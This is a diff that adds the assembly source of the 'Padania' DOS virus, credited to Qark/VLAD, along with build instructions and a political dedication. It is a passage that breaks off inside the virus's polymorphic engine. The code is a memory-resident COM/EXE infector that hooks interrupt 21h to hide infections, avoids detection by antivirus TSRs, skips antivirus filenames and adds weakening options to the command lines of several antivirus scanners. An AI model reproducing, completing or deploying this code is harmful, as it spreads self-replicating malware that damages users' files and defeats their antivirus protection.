@@ -1,0 +1,1816 @@
+
+;               Padania
+;               by Qark/VLAD
+;
+;  This virus infects COM/EXE, direct action, as well as whilst resident.
+;  It is full stealth - network compatible stealth - it doesn't use any
+;  SFT's. It scan's the MCB chain for AV TSR's and won't go resident if it
+;  finds one.  It sets up its own MCB and sets the owner as DOS.  The start
+;  of the interrupt 21 handler has the standard DOS instructions so that a
+;  person debugging casually won't know any difference.  The virus won't
+;  infect anything that uses overlays.  It has its own polymorphic engine
+;  that size pads so that the full stealth will work.  The virus adds
+;  command line options to a number of anti-virus utilities.  It won't infect
+;  some specified filenames that correspond with anti-virus utilities.  It
+;  turns into a fast infector when certain programs are run.  It contains
+;  many retro features.
+;
+;  I have dedicated this virus to my friends in Northern Italy who desire
+;  separation of their country, Padania, from southern Italy.
+;
+; For a change:
+;       assemble with tasm /m2 right
+;       tlink right
+;       exe2bin right.exe right.com
+
+
+jumps
+Virus   segment
+assume cs:virus,ds:virus,ss:virus
+        org     0
+code:
+vsize   equ     offset vsizer - offset code+85     ;Physical Size
+msize   equ     offset msizer - offset code     ;Memory Size
+
+        push    es
+        mov     ah,52h
+        int     21h
+        mov     ds,word ptr es:[bx-2]
+        pop     es
+        
+        mov     bx,ds                   ;BX = PSP
+        mov     al,'Z' xor 0f9h
+        xor     al,0f9h                 ;AL = 'Z'
+nextmcb:
+        mov     ds,bx                   ;DS = MCB Seg
+
+        cmp     word ptr ds:[8],'BT'    ;TB*
+        je      already_resident
+        cmp     word ptr ds:[8],'EN'    ;NEMESIS
+        je      already_resident
+
+        cmp     byte ptr ds:[0],al
+        je      foundz
+
+        add     bx,word ptr ds:[3]      ;Size of Memory block
+        inc     bx
+        jmp     nextmcb
+
+foundz:
+        cmp     word ptr ds:[8],'OD'    ;DOS
+        je      already_resident
+        mov     ax,((msize+0fh)/10h)+1
+        sub     word ptr ds:[3],ax              ;Allocate memory from MCB
+        sub     word ptr es:[2],ax              ;From PSP
+        mov     al,'M' xor 0bfh
+        xor     al,0bfh
+        mov     byte ptr ds:[0],al              ;Make it a M block
+
+        add     bx,word ptr ds:[3]
+        inc     bx
+        mov     ds,bx                           ;DS=Virus MCB
+
+        mov     al,'Z' xor 88h
+        xor     al,88h
+        mov     byte ptr ds:[0],al
+        mov     ax,8+99h
+        sub     ax,99h
+        mov     word ptr ds:[1],ax              ;DOS segment
+        mov     ax,(msize+0fh)/10h
+        mov     word ptr ds:[3],ax
+        mov     word ptr ds:[8],'OD'
+        mov     byte ptr ds:[10],'S'
+        mov     byte ptr ds:[11],0
+
+        inc     bx
+        mov     ds,bx
+
+        call    get_delta
+retdelta:
+        sub     si,offset retdelta
+        mov     word ptr cs:[si+delta],si
+
+        mov     word ptr cs:[si+stub_cs],cs
+        mov     ax,si
+        add     ax,offset already_resident
+        mov     word ptr cs:[si+stub_ip],ax
+
+        mov     cx,vsize
+        sub     di,di
+movevirus:
+        mov     al,byte ptr cs:[si]
+        mov     byte ptr ds:[di],al
+        inc     si
+        inc     di
+        loop    movevirus
+
+        push    ds
+        mov     ax,offset nextcs
+        push    ax
+        retf
+nextcs:
+
+        sub     ax,ax
+        mov     ds,ax
+
+        mov     si,2
+
+        ;Set interrupt 21h
+        mov     ax,word ptr ds:[si+21h*4-2]
+        mov     word ptr cs:[o21],ax
+        mov     ax,word ptr ds:[si+21h*4]
+        mov     word ptr cs:[o21+2],ax
+
+        mov     word ptr ds:[si+21h*4-2],offset virus_handler
+        mov     word ptr ds:[si+21h*4],cs
+
+        ;Kill a few AV utilities
+        mov     ax,4b00h xor 9641h
+        xor     ax,9641h
+        call    simint21
+
+        mov     ah,19h          ;Don't do it on floppy drives.. too slow!
+        call    simint21
+        cmp     al,2
+        jb      return_to_stub
+
+        push    es
+        mov     ah,2fh
+        call    simint21
+        mov     word ptr cs:dtads,es
+        mov     word ptr cs:dtadx,bx
+        pop     es
+
+        mov     ds,word ptr cs:stub_cs
+        mov     dx,word ptr cs:delta
+        mov     ah,1ah
+        call    simint21
+
+        push    cs
+        pop     ds
+
+        sub     ax,ax
+ffloop:
+        add     ah,4eh
+        push    cs
+        pop     ds
+        mov     dx,offset starcom
+        mov     cx,3
+        call    simint21
+        jc      restdta
+
+        mov     si,word ptr delta
+        mov     ds,word ptr stub_cs
+
+        mov     al,byte ptr [si+16h]
+        and     al,1fh
+        cmp     al,2
+        je      nextfile
+        lea     dx,[si+1eh]
+        mov     ax,4300h
+        int     21h
+        jmp     restdta
+nextfile:
+        mov     ax,100h
+        jmp     ffloop
+restdta:
+        push    cs
+        pop     ds
+        mov     dx,word ptr dtadx
+        mov     ds,word ptr dtads
+        mov     ah,1ah
+        call    simint21
+return_to_stub:
+        db      0eah
+stub_ip dw      offset already_resident
+stub_cs dw      0
+
+delta   dw      0
+starcom db      "*m.com",0
+
+dtads   dw      0
+dtadx   dw      0
+
+already_resident:
+;return to user
+
+        call    get_delta
+retdelta2:
+        push    cs
+        pop     ds
+        sub     si,offset retdelta2
+
+        mov     ax,ss
+        mov     bx,cs
+        cmp     ax,bx
+        jne     exeload
+
+        mov     di,100h xor 1928h
+        xor     di,1928h
+
+        mov     ax,word ptr [si+combyte]
+        mov     word ptr ds:[di],ax
+        mov     al,byte ptr [si+combyte+2]
+        mov     byte ptr ds:[di+2],al
+
+        sub     ax,ax
+        mov     bx,ax
+        mov     cx,ax
+        mov     dx,ax
+        mov     si,ax
+
+        jmp     di
+
+exeload:
+        push    es
+        pop     ds
+        mov     ax,es
+        add     ax,10h
+        add     ax,word ptr cs:[si+header+16h]
+        mov     word ptr cs:[si+run_time_cs_ip+2],ax
+        mov     ax,word ptr cs:[si+header+14h]
+        mov     word ptr cs:[si+run_time_cs_ip],ax
+        jmp     $+2
+
+        mov     ax,es
+        add     ax,10h
+        add     ax,word ptr cs:[si+header+0eh]
+
+        cli
+        mov     ss,ax
+        mov     sp,word ptr cs:[si+header+10h]
+        sti
+
+
+        sub     ax,ax
+        mov     bx,ax
+        mov     cx,ax
+        mov     dx,ax
+        mov     si,ax
+        mov     di,ax
+
+        db      0eah
+run_time_cs_ip  dd      0
+
+db      "Padania Virus by Qark/VLAD",0dh,0ah
+db      "This virus is dedicated to all the people in Padania",0dh,0ah
+db      "(Northern Italy) who seek separation from Southern Italy",0dh,0ah
+db      "and to their party Lega Nord.",0dh,0ah
+
+db      "Questo virus e' dedicato agli abitanti della Padania, in cerca dell'",0dh,0ah
+db      "indipendenza dal sud italia, ed al loro movimento Lega Nord",0dh,0ah
+
+combyte dw      20cdh
+        db      0
+
+virus_handler:
+        ;From the DOS kernel.. looks like normal DOS code this way.
+        cli
+        cmp     ah,6ch
+        ja      sj1
+        cmp     ah,33h
+        jb      sj1
+        jz      sj2
+        cmp     ah,64h
+        ja      sj2
+        jz      sj1
+        cmp     ah,51h
+        jz      sj1
+        cmp     ah,62h
+        jz      sj2
+        cmp     ah,50h
+        jz      sj1
+sj2:
+        push    ax
+        push    bx
+        push    cx
+        nop
+        pop     cx
+        pop     bx
+        pop     ax
+sj1:
+        
+        cmp     ah,byte ptr cs:heurfunc         ;File Execute
+        je      dinfect
+        cmp     ah,3dh          ;File Open
+        je      dinfect
+        cmp     ax,6c00h        ;File Open
+        je      dinfect
+        cmp     ah,43h          ;File Attribute Change
+        je      dinfect
+        cmp     ah,41h          ;File Delete
+        je      dinfect
+        cmp     ah,byte ptr cs:heurfunc+1       ;FCB Find First
+        je      dfcbstealth
+        cmp     ah,byte ptr cs:heurfunc+2       ;FCB Find Next
+        je      dfcbstealth
+        cmp     ah,4eh          ;Find First
+        je      dfilestealth
+        cmp     ah,4fh          ;Find Next
+        je      dfilestealth
+        cmp     ah,42h          ;File Seek
+        je      dseekstealth
+        cmp     ah,3fh          ;File Read
+        je      dreadstealth
+        cmp     ax,5700h        ;Get Time
+        je      dtimestealth
+        cmp     ah,3eh
+        je      dclosetime
+        
+exitv21:
+        db      0eah
+o21     dd      0
+
+heurfunc        db      4bh,11h,12h
+
+dinfect:
+        jmp     infect
+dfcbstealth:
+        jmp     fcbstealth
+dfilestealth:
+        jmp     filestealth
+dseekstealth:
+        jmp     seekstealth
+dreadstealth:
+        jmp     readstealth
+dtimestealth:
+        jmp     timestealth
+dclosetime:
+        jmp     closetime
+
+closetime:
+        call   handlechk
+        je     infclose
+noclosestealth:
+        jmp    exitv21
+infclose:
+        ;call    check4stealth
+        ;je      noclosestealth
+
+        push    ax
+        push    cx
+        push    dx
+        mov     ax,5700h
+        call    simint21
+        and     cl,0e0h
+        or      cl,2
+        mov     ax,5701h xor 0fa49h
+        xor     ax,0fa49h
+        call    simint21
+        pop     dx
+        pop     cx
+        pop     ax
+        jmp    exitv21
+
+timestealth:
+;5700h
+        call    simint21
+        jc      timeexit
+        pushf
+        push    cx
+        and     cl,1fh
+        cmp     cl,1fh
+        jne     oktimeout
+        pop     cx
+        and     cl,0e0h
+        or      cl,2
+        push    cx
+oktimeout:
+        pop     cx
+        popf
+timeexit:
+        retf    2
+
+handlechk       proc    near
+;if je then yes, infected!
+        push    cx
+        push    dx
+        call    get_time
+        and     cl,1fh
+        cmp     cl,1fh
+        pop     dx
+        pop     cx
+        ret
+handlechk       endp
+
+
+readstealth:
+        ;handles 3fh
+        ;bx=file handle
+        call    check_handle
+        jz      isreadfile
+notread:
+        jmp     exitv21
+isreadfile:
+        call    handlechk
+        jne     notread
+        call    check4stealth
+        je      notread
+        push    ax
+        push    dx
+        call    getcurfilepointer
+        mov     word ptr cs:seekdx,dx
+        mov     word ptr cs:seekax,ax
+        pop     dx
+        pop     ax
+        mov     word ptr cs:readaddr,dx
+        call    simint21
+        jc      readfail
+        pushf
+        push    cx
+        push    dx
+        push    si
+        mov     word ptr cs:bytesread,ax        ;Save bytes read
+        cmp     word ptr cs:seekdx,0
+        jne     notheader
+        cmp     word ptr cs:seekax,1ch
+        jae     notheader
+
+        ;The header was read from.
+        ;Read old header data over data read
+        
+        call    getcurfilepointer
+        push    dx
+        push    ax
+
+        call    fpend
+
+        sub     ax,offset vsizer-offset header
+        sbb     dx,0
+        add     ax,word ptr cs:seekax
+        adc     dx,0
+
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4200h
+        call    simint21
+
+        mov     ax,word ptr cs:seekax
+        add     ax,word ptr cs:bytesread
+        cmp     ax,1ch
+        jbe     oknumread
+        mov     ax,1ch
+        sub     ax,word ptr cs:seekax
+        mov     cx,ax
+        jmp     fixedcx
+oknumread:
+        mov     cx,word ptr cs:bytesread
+fixedcx:
+        mov     dx,word ptr cs:readaddr
+        mov     ah,3fh
+        call    simint21
+
+        pop     dx
+        pop     cx
+        mov     ax,4200h
+        call    simint21
+
+notheader:      ;check read past end of file
+        mov     ax,word ptr cs:bytesread
+        add     word ptr cs:seekax,ax
+        adc     word ptr cs:seekdx,0
+
+        call    fpend
+        sub     ax,vsize
+        sbb     dx,0
+
+        cmp     dx,word ptr cs:seekdx
+        ja      withinbounds
+        jb      rbadread
+        cmp     ax,word ptr cs:seekax
+        jae     withinbounds
+rbadread:
+        push    ax
+        push    dx
+        sub     word ptr cs:seekax,ax
+        sbb     word ptr cs:seekdx,dx
+        mov     ax,word ptr cs:seekax
+        sub     word ptr cs:bytesread,ax
+        pop     dx
+        pop     ax
+
+        mov     word ptr cs:seekdx,dx
+        mov     word ptr cs:seekax,ax
+withinbounds:
+        mov     dx,word ptr cs:seekax
+        mov     cx,word ptr cs:seekdx
+        mov     ax,4200h
+        call    simint21
+
+        pop     si
+        pop     dx
+        pop     cx
+        mov     ax,word ptr cs:bytesread
+        popf
+readfail:
+        retf    2
+
+getcurfilepointer       proc    near
+;returns the file pointer in dx:ax
+        push    cx
+        mov     ax,4201h
+        sub     cx,cx
+        cwd
+        call    simint21
+        pop     cx
+        ret
+getcurfilepointer       endp
+
+seekstealth:
+        ;bx=file handle
+        ;stealths file pointer function 42h to give original filesize
+
+        call    check_handle
+        jz      isseekfile
+notseek:
+        jmp     exitv21
+isseekfile:
+        call    handlechk
+        jne     notseek
+        call    check4stealth
+        je      notseek
+        call    simint21
+        jc      exitseek
+        pushf
+        mov     word ptr cs:seekdx,dx
+        mov     word ptr cs:seekax,ax
+        push    ax
+        push    cx
+        push    dx
+        mov     ax,4202h
+        cwd
+        sub     cx,cx
+        call    simint21
+        sub     ax,vsize
+        sbb     dx,0
+        cmp     dx,word ptr cs:seekdx
+        ja      smallenuff
+        jb      reallybad
+        cmp     ax,word ptr cs:seekax
+        jae     smallenuff
+reallybad:
+        mov     word ptr cs:seekdx,dx
+        mov     word ptr cs:seekax,ax
+smallenuff:
+        mov     dx,word ptr cs:seekax
+        mov     cx,word ptr cs:seekdx
+        mov     ax,4200h
+        call    simint21
+        pop     dx
+        pop     cx
+        pop     ax
+        popf
+        mov     ax,word ptr cs:seekax
+        mov     dx,word ptr cs:seekdx
+exitseek:
+        retf    2
+
+readaddr        dw      0
+bytesread       dw      0
+seekax          dw      0
+seekdx          dw      0
+
+filestealth:
+        call    check4stealth
+        jne     normalstealth
+        jmp     exitv21
+normalstealth:
+        call    simint21
+        jc      noffiles
+
+        pushf
+        push    ax
+        push    bx
+        push    si
+        push    es
+
+        mov     ah,2fh
+        call    simint21
+
+        lea     si,word ptr [bx+1eh]
+findenn:
+        cmp     byte ptr es:[si],0
+        je      foundnn
+        inc     si
+        jmp     findenn
+foundnn:
+        cmp     word ptr es:[si-2],'EX'
+        je      goodfile
+        cmp     word ptr es:[si-2],'MO'
+        je      goodfile
+goodfile:
+        mov     ax,word ptr es:[bx+16h]
+        and     al,1fh
+        cmp     al,2
+        jne     notgoodfile
+        cmp     word ptr es:[bx+1ch],0
+        jne     oksizefcb
+        cmp     word ptr es:[bx+1ah],1499+vsize
+        jb      notgoodfile
+oksizefcb:
+        sub     word ptr es:[bx+1ah],vsize
+        sbb     word ptr es:[bx+1ch],0
+notgoodfile:
+        pop     es
+        pop     si
+        pop     bx
+        pop     ax
+        popf
+noffiles:
+        retf    2
+
+
+fcbstealth:
+        push    ax
+        push    bx
+        push    ds
+        mov     ah,51h
+        call    simint21
+        dec     bx
+        mov     ds,bx
+        cmp     word ptr ds:[8+2],'MM'
+        pop     ds
+        pop     bx
+        pop     ax
+        jne     nofcbstealth
+
+        call    simint21
+        cmp     al,0
+        je      filefound
+        iret
+filefound:
+        push    ax
+        push    bx
+        push    ds
+        push    es
+        mov     ah,2fh
+        call    simint21
+
+        cmp     byte ptr es:[bx],0ffh
+        jne     xtndfcb
+        add     bx,7
+xtndfcb:
+        cmp     word ptr es:[bx+9],'XE'
+        je      okfcbname
+        cmp     word ptr es:[bx+9],'OC'
+        je      okfcbname
+        jmp     exitfcb
+okfcbname:
+        mov     al,byte ptr es:[bx+17h]
+        and     al,1fh
+        cmp     al,2
+        jne     exitfcb
+        cmp     word ptr es:[bx+1fh],0
+        jne     oksizeff
+        cmp     word ptr es:[bx+1dh],1499+vsize
+        jb      exitfcb
+oksizeff:
+        sub     word ptr es:[bx+1dh],vsize
+        sbb     word ptr es:[bx+1fh],0
+exitfcb:
+        pop     es
+        pop     ds
+        pop     bx
+        pop     ax
+        iret
+
+nofcbstealth:
+        jmp     exitv21
+
+infect:
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+        push    bp
+
+        call    set_int24
+        xchg    ah,al
+        cmp     ax,4bh
+        xchg    ah,al
+        jne     notscanner
+        call    new_command_line
+notscanner:
+        call    infect_file
+        call    restore24
+
+        pop     bp
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+        cmp     ah,3dh
+        je      open_entry
+        cmp     ax,6c00h
+        je      open_entry
+dontopen:
+        jmp     exitv21
+
+open_entry:
+;exe/com, see if it's infected.. if so, change time to 62 seconds
+;if not.. infect it!
+        push    si
+        push    dx
+        cmp     ah,6ch
+        jne     not6c
+        test    dl,2
+        jz      notcreate
+        stc
+        jmp     fail6c
+notcreate:
+        mov     dx,si
+not6c:
+        mov     si,dx
+        call    check_name
+fail6c:
+        pop     dx
+        pop     si
+        jc      dontopen
+        call    simint21        ;open it
+        jc      opened
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        mov     bx,ax
+        mov     ax,5700h
+        call    simint21
+        jc      fgetit
+        push    cx
+        and     cl,1fh
+        cmp     cl,2
+        pop     cx
+        jne     fgetit
+        mov     ax,5701h xor 38bch       ;set 62 seconds marker
+        xor     ax,38bch
+        or      cl,1fh
+        call    simint21
+fgetit:
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+opened:
+        retf    2
+
+infect_file     proc    near
+;ds:dx=filename
+        cmp     ah,6ch
+        jne     no6cfix
+        mov     dx,si
+no6cfix:
+        mov     si,dx
+        call    check_name
+        jnc     okname
+        ret
+attributes      dw      0
+okname:
+        mov     ax,4300h
+        call    simint21
+        jc      tryopen
+        mov     word ptr cs:attributes,cx
+        sub     cx,cx
+        mov     ax,4301h xor 4ab3h
+        xor     ax,4ab3h
+        call    simint21
+tryopen:
+        mov     ax,3d02h
+        call    simint21
+        jc      filefail
+
+        push    cs
+        pop     ds
+
+        mov     bx,ax
+
+        mov     dx,offset header
+        mov     cx,1ch
+        mov     ah,3fh
+        call    simint21
+
+        mov     si,offset header
+
+        mov     ax,'ZM' xor 9977h
+        xor     ax,9977h
+
+        cmp     word ptr [si],ax
+        je      infexe
+        xchg    ah,al
+        cmp     word ptr [si],ax
+        je      infexe
+        call    infect_com
+        jmp     finishup
+infexe:
+        call    infect_exe
+finishup:
+        mov     ah,3eh
+        call    simint21
+
+        mov     dx,offset vsizer
+        mov     cx,word ptr attributes
+        mov     ax,4301h xor 96ddh
+        xor     ax,96ddh
+        call    simint21
+
+filefail:
+        ret
+infect_file     endp
+
+check4stealth   proc    near
+;je nostealth
+        push    ax
+        push    bx
+        push    ds
+        
+        mov     ah,51h
+        call    simint21
+        dec     bx
+        mov     ds,bx
+        mov     ax,word ptr ds:[8]
+        cmp     ax,'KP'                 ;PKzip
+        je      foundfast
+        cmp     ax,'RA'                 ;ARj
+        je      foundfast
+        cmp     ax,'UU'                 ;UUencode
+        je      foundfast
+        cmp     ax,'AB'                 ;BAckup
+        je      foundfast
+        cmp     ax,'HL'                 ;LHa
+        je      foundfast
+        cmp     ax,'AR'                 ;RAr
+        je      foundfast
+        cmp     ax,'OM'                 ;MOdem
+        je      foundfast
+        cmp     ax,'PS'                 ;SPeedisk
+        je      foundfast
+        cmp     ax,'ED'                 ;DEfrag
+        je      foundfast
+
+        cmp     ax,'SM'                 ;MSbackup
+        je      test4b
+        cmp     ax,'PC'                 ;CPbackup
+        jne     foundfast
+test4b:
+        cmp     byte ptr ds:[10],'B'
+foundfast:
+        pop     ds
+        pop     bx
+        pop     ax
+        ret
+check4stealth   endp
+
+check_name      proc    near
+        push    ax
+        push    ds
+        push    si
+        push    di
+        push    es
+        push    cs
+        pop     es
+        mov     di,offset vsizer
+        mov     ah,60h
+        call    simint21
+        
+        push    cs
+        pop     ds
+
+        mov     si,offset vsizer
+        cmp     byte ptr [si+2],'/'
+        je      fail_name
+findend:
+        cmp     byte ptr [si],0
+        je      findnamestart
+        inc     si
+        mov     di,si
+        jmp     findend
+findnamestart:
+        cmp     byte ptr [si],'\'
+        je      foundnamestart
+        dec     si
+        jmp     findnamestart
+foundnamestart:
+        inc     si
+        mov     ax,word ptr [si]
+        cmp     ax,'VA'                 ;AVxxxx
+        je      fail_name
+        cmp     ax,'BT'                 ;TBxxxx
+        je      fail_name
+        cmp     ax,'IV'                 ;IV
+        je      fail_name
+        cmp     ax,'RP'                 ;PRxxxx
+        je      fail_name
+        cmp     ax,'V-'                 ;AVP?
+        je      fail_name
+        mov     ax,word ptr [di-2]      ; . e x e 0
+                                        ;   -3-2-1|
+        cmp     ax,'EX'
+        je      pass_name
+        cmp     ax,'MO'
+        je      pass_name
+
+        jmp     fail_name
+
+pass_name:
+        clc
+        jmp     $+3
+fail_name:
+        stc
+        pop     es
+        pop     di
+        pop     si
+        pop     ds
+        pop     ax
+
+        ret
+check_name      endp
+
+New_Command_Line        proc    near
+;adds parameters to the command lines of AV programs
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+
+        push    cs
+        pop     es
+        mov     si,dx
+        mov     di,offset vsizer
+        mov     ah,60h
+        call    simint21
+
+        push    cs
+        pop     ds
+
+        mov     si,offset vsizer
+findeon:
+        inc     si
+        cmp     byte ptr [si],0
+        jne     findeon
+findsl:
+        dec     si
+        cmp     byte ptr [si],'\'
+        jne     findsl
+        inc     si
+        ;si now points to the start of the name!
+        mov     di,offset names
+        cld
+
+        push    si
+matchloop:
+        lodsb
+        cmp     byte ptr [di],0
+        je      matched
+        inc     di
+        cmp     al,byte ptr [di-1]
+        je      matchloop
+        pop     si
+        push    si
+f1namel:
+        cmp     byte ptr [di],0
+        je      f2name1
+        inc     di
+        jmp     f1namel
+f2name1:
+        inc     di
+f2name:
+        cmp     byte ptr [di],0
+        je      f3name
+        inc     di
+        jmp     f2name
+f3name:
+        inc     di
+        cmp     byte ptr [di],0
+        jne     matchloop
+        pop     si
+        jmp     none_found
+matched:
+        pop     si        
+        inc     di
+        pop     es
+        push    es
+        mov     si,word ptr es:[bx+2]
+        mov     ds,word ptr es:[bx+4]
+        mov     al,byte ptr cs:[di]
+        add     byte ptr [si],al
+findcr:
+        inc     si
+        cmp     byte ptr [si],0dh        
+        jne     findcr
+        mov     byte ptr [si],20h
+execl:
+        inc     si
+        inc     di
+        mov     al,byte ptr cs:[di]
+        cmp     al,0
+        je      finalprep
+        mov     byte ptr [si],al
+        jmp     execl
+finalprep:
+        mov     byte ptr [si],0dh
+        
+none_found:
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+        ret
+new_command_line        endp
+        
+;file name followed by command line
+names   db      "TBSCAN",0,6,"CO NM",0
+        db      "TBSETUP",0,3,"RM",0
+        db      "AVP",0,3,"/M",0
+        db      "F-PROT",0,15,"/NOMEM /COMPAT",0
+        db      "SCAN",0,7,"/NOMEM",0
+        db      "AVSCAN",0,4,"/NM",0
+        db      0
+
+infect_com      proc    near
+;bx=filehandle, header read into 'header'
+        call    check_infect
+        jne     not_infected
+        ret
+not_infected:
+        mov     ax,word ptr [si]
+        mov     word ptr combyte,ax
+        mov     al,byte ptr [si+2]
+        mov     byte ptr combyte+2,al
+
+        call    save_time
+
+        call    fpend
+        or      dx,dx
+        jnz     badcom
+        cmp     ax,50000
+        ja      badcom
+        cmp     ax,1500
+        jb      badcom
+        push    ax
+        sub     ax,3
+        mov     word ptr comstart+1,ax
+        pop     ax
+        add     ax,100h
+        mov     dl,1
+        sub     si,si
+        mov     di,offset encplace
+        mov     cx,offset header
+        push    cs
+        pop     es
+        call    spoly
+
+        mov     dx,offset encplace
+        mov     ah,40h
+        call    simint21
+        jc      badcom
+
+        mov     dx,offset header
+        mov     cx,1ch
+        mov     ah,40h
+        call    simint21
+        
+        call    fpstart
+        
+        mov     dx,offset comstart
+        mov     cx,3
+        mov     ah,40h
+        call    simint21
+
+        call    set_time
+badcom:
+        ret
+infect_com      endp
+
+infect_exe      proc    near
+;bx=filehandle, header read into 'header'
+
+        call    check_infect
+        jne     not_exe_infect
+        ret
+not_exe_infect:
+        cmp     word ptr [si+18h],40h   ;Don't do windows EXE's
+        je      badexe
+        cmp     word ptr [si+0ch],-1
+        jne     badexe
+
+        call    save_time
+        
+        ;Below is checking for internal overlays
+        call    fpend
+        or      dx,dx
+        jnz     exesizeok
+        cmp     ax,2000
+        jb      badexe
+exesizeok:
+        push    bx
+        mov     bx,ax
+        mov     cx,dx
+        cmp     word ptr [si+2],0
+        je      nopartpage
+        dec     word ptr [si+4]
+nopartpage:
+        mov     ax,200h
+        mul     word ptr [si+4]
+        add     ax,[si+2]
+        adc     dx,0
+
+        cmp     ax,bx
+        pop     bx
+        jne     badexe          ;overlays ?
+        cmp     cx,dx
+        jne     badexe          ;overlays ?
+
+        cmp     word ptr [si+2],0
+        je      nopartpage2
+        inc     word ptr [si+4]
+nopartpage2:
+        call    fpend
+        mov     cx,10h
+        div     cx
+        mov     ax,dx
+        mov     dl,0
+        sub     si,si
+        mov     di,offset encplace
+        mov     cx,offset header
+        push    cs
+        pop     es
+        call    spoly
+
+        mov     dx,offset encplace
+        mov     ah,40h
+        call    simint21
+        jc      badexe
+
+        mov     dx,offset header
+        mov     si,dx
+        mov     cx,1ch
+        mov     ah,40h
+        call    simint21
+                
+        call    fpend
+
+        sub     ax,vsize
+        sbb     dx,0
+
+        mov     cx,10h
+        div     cx
+
+        sub     ax,word ptr [si+8]
+
+        mov     word ptr [si+14h],dx
+        mov     word ptr [si+16h],ax
+
+        add     ax,(offset vsizer - offset code)/16
+        inc     ax
+        mov     word ptr [si+0eh],ax
+        mov     word ptr [si+10h],512
+
+        ;dec     ax
+        ;add     dx,offset vsizer+5000
+        ;and     dx,0fffeh
+        ;mov     word ptr [si+0eh],ax
+        ;mov     word ptr [si+10h],dx
+
+        call    fpend
+
+        mov     cx,200h
+        div     cx
+        or      dx,dx
+        jz      nopageinc
+        inc     ax
+nopageinc:
+        mov     word ptr [si+2],dx
+        mov     word ptr [si+4],ax
+        call    fpstart
+
+        mov     dx,si
+        mov     cx,1ch
+        mov     ah,40h
+        call    simint21
+
+        call    set_time
+badexe:
+        ret
+infect_exe      endp
+
+;Various file pointer functions
+fpend:
+        mov     al,2
+        jmp     fp
+fpstart:
+        mov     al,0
+        jmp     fp
+fpcur:
+        mov     al,1
+fp:
+        mov     ah,42h
+        sub     cx,cx
+        cwd
+        call    simint21
+        ret
+
+check_handle    proc    near
+;jz isfile
+        push    ax
+        push    dx
+        mov     ax,4400h
+        call    simint21
+        test    dl,80h
+        pop     dx
+        pop     ax
+        ret
+check_handle    endp
+
+check_infect    proc    near
+;if je then yes, infected!
+        push    cx
+        push    dx
+        call    get_time
+        and     cl,1fh
+        cmp     cl,2
+        pop     dx
+        pop     cx
+        ret
+check_infect    endp
+
+get_time        proc    near
+        push    ax
+        mov     ax,5700h
+        call    simint21
+        pop     ax
+        ret
+get_time        endp
+
+save_time       proc    near
+        call    get_time
+        mov     word ptr cs:date,dx
+        mov     word ptr cs:time,cx
+        ret
+save_time       endp
+
+date    dw      0
+time    dw      0
+
+set_time        proc    near
+        mov     dx,word ptr cs:date
+        mov     cx,word ptr cs:time
+        and     cl,0e0h
+        or      cl,2
+        mov     ax,5701h xor 9912h
+        xor     ax,9912h
+        call    simint21
+        ret
+set_time        endp
+
+get_delta       proc    near
+        pop     si
+        push    si
+        ret
+get_delta       endp
+
+set_int24       proc    near
+        push    ax
+        push    dx
+        push    ds
+        push    es
+        push    bx
+        mov     ax,3524h
+        call    simint21
+        
+        push    cs
+        pop     ds
+        mov     word ptr saved24,bx
+        mov     word ptr saved24+2,es
+
+        mov     dx,offset errorhandler
+        mov     ax,2524h
+        call    simint21
+
+        pop     bx
+        pop     es
+        pop     ds
+        pop     dx
+        pop     ax
+        ret
+
+saved24 dd      0
+
+set_int24       endp
+
+restore24       proc    near
+        push    ax
+        push    ds
+        push    dx
+        mov     ds,word ptr cs:saved24+2
+        mov     dx,word ptr cs:saved24
+        mov     ax,2524h
+        call    simint21
+        pop     dx
+        pop     ds
+        pop     ax
+        ret
+restore24       endp
+
+errorhandler:
+        mov     al,3
+        iret
+
+spoly   proc    near
+;overall size of the compiled code is about 742 bytes
+;ax=delta offset
+;dl=1 = com file = 0 = exe file
+;ds:si = virus = ds:0
+;es:di = place to put decryptor + encrypted virus
+;cx=virus size
+;ds=cs=es
+;on return cx=size of stuff = 85
+;all decryptors are 85 bytes long - stable length
+
+        cld
+        mov     word ptr regtable,1
+        mov     word ptr regtable+2,0
+        mov     word ptr regtable+4,1
+        mov     word ptr regtable+6,0
+
+        mov     word ptr deltaval,ax
+        mov     word ptr virusval,cx
+        mov     byte ptr setupbyte,0
+
+        mov     word ptr virusget,si
+        mov     word ptr virusput,di
+
+        mov     byte ptr inloop,0
+
+        ;Setup pointer register
+
+        mov     ax,3
+        call    genrand
+
+        shl     ax,1
+        add     ax,offset sip
+        mov     si,ax
+
+        mov     al,byte ptr [si]
+        mov     byte ptr pointrm,al
+        mov     al,byte ptr [si+1]
+        mov     byte ptr pointr,al
+        sub     ah,ah
+        add     ax,offset regtable
+        mov     si,ax
+        mov     byte ptr [si],1
+
+        ;Setup cipher register
+nextcipher:
+        mov     ax,8
+        call    genrand
+        mov     byte ptr cipherr,al
+        add     ax,offset regtable
+        mov     si,ax
+        cmp     byte ptr [si],1
+        je      nextcipher
+        mov     byte ptr [si],1
+
+        ;Setup vsize register
+nextvsize:
+        mov     ax,8
+        call    genrand
+        mov     byte ptr virusr,al
+        add     ax,offset regtable
+        mov     si,ax
+        cmp     byte ptr [si],1
+        je      nextvsize
+        mov     byte ptr [si],1
+
+        mov     byte ptr regtable,0     ;clear AX
+
+        call    make_stub
+
+        call    makegarbage
+
+        mov     byte ptr inloop,1
+        mov     bp,di
+
+        or      dl,dl           ;0=exe, 1 = com
+        jnz     comfile
+        mov     al,2eh
+        stosb
+comfile:
+        mov     al,31h
+        stosb
+        mov     al,byte ptr cipherr
+        mov     cl,3
+        shl     al,cl
+        or      al,byte ptr pointrm
+        stosb
+
+        call    makegarbage
+
+        mov     al,40h
+        or      al,byte ptr pointr
+        stosb
+
+        call    makegarbage
+
+        mov     al,81h
+        stosb
+        mov     al,byte ptr cipherr
+        or      al,0c0h
+        stosb
+        call    randval
+        stosw
+        mov     word ptr addval,ax
+
+        call    makegarbage
+
+        mov     al,48h
